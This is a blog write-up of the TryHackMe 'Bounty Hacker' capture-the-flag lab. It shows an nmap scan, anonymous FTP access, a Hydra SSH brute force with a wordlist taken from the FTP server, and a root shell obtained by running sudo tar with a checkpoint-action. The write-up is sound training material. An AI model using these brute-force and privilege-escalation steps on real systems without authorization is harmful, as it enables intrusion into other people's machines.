---
title:  "TryHackMe - Bounty Hacker writeup"
header:
  teaser: "/assets/images/THM_logo.jpg"
categories: 
  - TryHackMe
tags:
  - writeups
---

Bounty Hacker is an easy boot-to-root machine to get started. Definitely goes to starter pack on TryHackMe.

[Bounty Hacker on TryHackMe](https://tryhackme.com/room/cowboyhacker)

<figure>
	<a href="/assets/images/BountyHacker/bh_main.jpg"><img src="/assets/images/BountyHacker/bh_main.jpg"></a>
</figure>

*NOTE: All passwords listed there are fake. Run listed commands to find real ones*

Here goes!

## Enumeration

### Nmap
Starting with `nmap` to determine what ports are open and what services are running.

Meaning of used options can be seen in my previous THM writeups or in `nmap --help`
  
Full command and result of scanning: 
{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ sudo nmap -T4 -p- -A 10.10.238.239
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 06:56 EDT
Nmap scan report for 10.10.238.239
Host is up (0.14s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.57.246
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

m0rn1ngstr@kali:~/THM/BountyHacker$

{% endhighlight %}

After reviewing the results of `nmap` scan we can point out some useful findings:

1. anonymous access to `FTP` on port 21
2. `HTTP page` and `Apache 2.4.18` server on port 80
3. `SSH` on port 22

### HTTP
After accessing this page in browser we saw this:

<figure>
	<a href="/assets/images/BountyHacker/site.jpg"><img src="/assets/images/BountyHacker/site.jpg"></a>
</figure>

This page is useful story-wise, but there is nothing really that we can use later, except for some names as possible `usernames`.

`Dirbuster` also resulted in nothing.

### FTP
Nmap scan showed us that `Anonymous FTP login allowed`, so why not use it.

{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ ftp 10.10.238.239
Connected to 10.10.238.239.
220 (vsFTPd 3.0.3)
Name (10.10.238.239:m0rn1ngstr): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (514.7772 kB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.03 secs (14.6399 kB/s)
ftp> exit
221 Goodbye.

{% endhighlight %}

We logged in `ftp`, found two files, let's check them out:

{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

m0rn1ngstr@kali:~/THM/BountyHacker$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin


{% endhighlight %}

Now we have a list of potential passwords and addition to possible usernames.
{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ cat users.txt 
vicious
*Side-note: I am not familiar with "Cowboy Bebop" fandom, so the user list is created only based on names I came across during the walkthrough. I am sure that it can be filtered more.*
lin
redeye
spike
jet
ed
faye
user
root
{% endhighlight %}

*Side-note: I am not familiar with "Cowboy Bebop" fandom, so the user list is created only based on names I came across during walkthrough. I am sure that it can be filtered more.*

## Gaining Shell and User flag

### HYDRA

Now we can `brute-force` our way in using `Hydra` for `ssh`.

Again, the meaning of options can be found in my previous writeups or in `hydra --help`

{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ hydra -t 4 -L users.txt -P locks.txt ssh://10.10.238.239
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 07:17:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 208 login tries (l:8/p:26), ~52 tries per task
[DATA] attacking ssh://10.10.238.239:22/
[STATUS] 33.00 tries/min, 33 tries in 00:01h, 175 to do in 00:06h, 4 active
[22][ssh] host: 10.10.238.239   login: lin   password: [some pass]

{% endhighlight %}

Now we got credentials and can log in `ssh` and read `user.txt`

###SSH

{% highlight console %}
m0rn1ngstr@kali:~/THM/BountyHacker$ ssh lin@10.10.238.239
The authenticity of host '10.10.238.239 (10.10.238.239)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.238.239' (ECDSA) to the list of known hosts.
lin@10.10.238.239's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{fake user flag}
lin@bountyhacker:~/Desktop$

{% endhighlight %}

## Privilege escalation and Root flag
Let's check which command can Lin run with sudo
{% highlight console %}
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

{% endhighlight %}

We can escalate privileges using [gtfobins](https://gtfobins.github.io/gtfobins/tar/)
{% highlight console %}
lin@bountyhacker:~/Desktop$ sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
/bin/tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhacker:~/Desktop# cd /root
root@bountyhacker:/root# ls
root.txt
root@bountyhacker:/root# cat root.txt 
THM{fake root flag}
root@bountyhacker:/root#

{% endhighlight %}

### That's it for this machine. Stay safe and Happy Hacking!
